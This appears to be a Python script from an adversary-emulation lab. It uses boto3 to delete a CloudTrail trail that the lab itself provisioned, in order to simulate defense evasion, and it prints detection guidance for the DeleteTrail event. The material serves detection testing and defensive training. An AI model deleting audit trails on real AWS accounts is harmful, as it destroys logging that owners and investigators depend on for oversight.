"""
Technique : aws.defense-evasion.cloudtrail-delete
Tactic    : Defense Evasion (T1562.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-delete/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target CloudTrail trail.

How the attack works:
  An attacker permanently deletes a CloudTrail trail, preventing any further
  API activity from being logged.  This is the most aggressive CloudTrail
  evasion technique — the trail cannot be recovered once deleted.  Logs
  already written to S3 remain, but new activity goes unrecorded.

Detection signal:
  - cloudtrail:DeleteTrail is the highest-signal CloudTrail event — it should
    trigger immediate automated incident response.
  - If the trail is an organisation trail, deletion also terminates logging
    for all member accounts.

Revert:
  - None. The trail is permanently deleted.
  - Run `pulumi up` in ../infra/ to recreate the trail.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir  = str(Path(__file__).parent.parent / "infra")
    infra      = get_pulumi_outputs(stack_dir)
    trail_name = infra.get("trail_name", "stratus-red-team-ct-delete-trail")
    trail_arn  = infra.get("trail_arn",  "")

    session    = boto3.Session()
    ct_client  = session.client("cloudtrail")

    # Verify trail exists
    try:
        ct_client.get_trail(Name=trail_name)
    except ClientError as exc:
        if exc.response["Error"]["Code"] == "TrailNotFoundException":
            print(f"[!] Trail not found: {trail_name}")
            print("    Did you run `pulumi up` in ../infra/?")
        else:
            print(f"[!] Unexpected error: {exc}")
        return

    # ── Step 1: Delete the trail ──────────────────────────────────────────────
    banner("Step 1 — Delete CloudTrail trail (DeleteTrail)")
    try:
        ct_client.delete_trail(Name=trail_arn or trail_name)
        print(f"  [+] Trail deleted: {trail_name}")
        print(f"  [!] CloudTrail event: cloudtrail:DeleteTrail")
        print(f"  [!] API activity is NO LONGER being logged to CloudTrail.")
        print(f"  [!] This is a NON-REVERSIBLE operation.")
    except ClientError as exc:
        print(f"  [!] DeleteTrail failed: {exc}")
        return

    banner("Complete")
    print("CloudTrail event generated: cloudtrail:DeleteTrail")
    print("\nDetection guidance:")
    print("  cloudtrail:DeleteTrail should trigger immediate incident response.")
    print("  Check whether a GuardDuty finding was also generated.")
    print("\nRun `pulumi up` in ../infra/ to recreate the trail.")


if __name__ == "__main__":
    main()
